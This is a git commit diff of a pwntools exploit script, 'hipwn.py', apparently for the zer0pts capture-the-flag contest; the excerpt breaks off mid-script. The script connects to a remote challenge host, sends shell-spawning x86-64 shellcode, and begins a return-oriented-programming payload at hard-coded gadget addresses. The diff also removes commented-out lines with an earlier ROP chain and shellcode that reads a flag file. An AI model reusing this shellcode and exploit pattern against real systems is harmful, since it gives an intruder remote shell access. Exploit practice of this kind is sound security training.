e6c1541173467cd90b8d060d5407a0566c990f91
buck20two <buck.20.two@gmail.com>
2020-03-08 17:21:50 -0400

    zer0pts

--- zer0pts/hipwn.py
+++ zer0pts/hipwn.py
@@ -18,22 +18,15 @@ if len(sys.argv) > 2 and sys.argv[1] == 'debug':
     p = process(pwnable)
     gdb.attach(p, debug_set_3)
 elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
-    #p = process("./seethefile", env=env)
-    #gdb.attach(p, debug_set_1)
     p = process(pwnable)
     gdb.attach(p, debug_set)
 else:
-    #p = process('./seethefile')
-    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}  nc 13.231.207.73 9010
     #p = process(pwnable)
     p = remote('13.231.207.73', 9010)
 
 p.recvuntil("name?")
 
-#p.sendline("A"*264 + p64(0x00402e67) + '/bin//sh' + p64(0x00402db8) + p64(0x0) + p64(0x00402d32) + p64(0x0))
 
-#shellcode = pwnlib.shellcraft.amd64.linux.readfile('/home/pwn/flag', dst='rdi')
-#shellcode += shellcraft.amd64.linux.write(1, 'rdi', 32)
 shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
 payload = p64(0x00402a30) #xor eax, eax
